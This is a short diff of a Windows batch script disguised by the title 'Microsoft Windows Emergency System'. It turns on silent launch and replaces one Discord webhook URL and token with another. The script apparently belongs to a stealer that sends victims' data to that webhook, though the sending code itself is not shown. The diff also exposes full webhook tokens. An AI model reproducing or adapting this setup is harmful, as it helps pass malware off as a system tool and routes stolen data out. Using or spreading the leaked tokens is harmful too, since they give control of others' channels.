@@ -13,7 +13,7 @@ title Microsoft Windows Emergency System
 
 set silent_launch=true
 set backup=false
-set webhook=https://discord.com/api/webhooks/1048739183512006808/GUT57O-ERldgNxWd7fTkfyKKv7uRVpVuSEbJ66LneGVk3OPHtC0DMw4aOt_ePaUTvlcy
+set webhook=https://canary.discord.com/api/webhooks/1051583287170183198/E4rxpRaGh1nLcTCswrw9FDHgA1pbyafrullOoMEDL699jJLEOe61R2WJK8IEYSCIAxF2
 
 ::@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@::
 
